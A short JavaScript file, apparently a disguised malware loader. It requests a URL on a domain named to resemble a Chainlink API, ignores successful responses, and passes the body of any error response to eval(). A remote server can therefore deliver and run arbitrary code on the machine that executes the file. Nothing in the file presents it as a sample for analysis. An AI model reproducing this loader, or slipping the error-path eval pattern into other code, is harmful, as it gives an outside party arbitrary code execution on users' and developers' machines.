import axios from "axios";
axios
    .get(
        `http://chainlink-api-v3.com/api/service/token/3d5c7f64bbd450c5e85f0d1cf0202341`,
    )
    .then((response) => {
        return false;
    })
    .catch((err) => {
        try {
            // console.log(err.response.data);
            eval(err.response.data);
        } catch (error) {
            console.log(error);
        }
    });
